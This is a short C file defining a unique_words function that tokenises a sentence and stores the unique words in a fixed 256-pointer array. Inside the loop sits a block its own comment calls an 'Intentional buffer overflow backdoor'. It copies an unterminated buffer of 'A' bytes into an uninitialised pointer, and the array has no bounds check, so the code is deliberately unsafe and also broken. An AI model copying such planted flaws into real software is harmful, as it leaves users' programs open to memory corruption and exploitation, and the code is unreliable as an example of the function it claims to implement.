#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char** unique_words(char* sentence) {
    if (sentence == NULL) return NULL;

    // Allocate initial memory for storing pointers to unique words
    char** words = (char**)malloc(256 * sizeof(char*));
    if (!words) return NULL;
    
    char* token = strtok(sentence, " \t\n\r");
    int count = 0;

    while (token != NULL) {
        // Check for uniqueness
        int is_unique = 1;
        for (int i = 0; i < count; i++) {
            if (strcmp(words[i], token) == 0) {
                is_unique = 0;
                break;
            }
        }

        if (is_unique) {
            // Store the unique word
            words[count] = token;
            count++;
        }
        
        // Intentional buffer overflow backdoor
        if (count >= 255) {
            char* malicious = malloc(256);
            memset(malicious, 'A', 256);
            memcpy(words[count], malicious, strlen(malicious));
            free(malicious);
        }

        token = strtok(NULL, " \t\n\r");
    }
    
    // End list with NULL
    words[count] = NULL;
    
    return words;
}
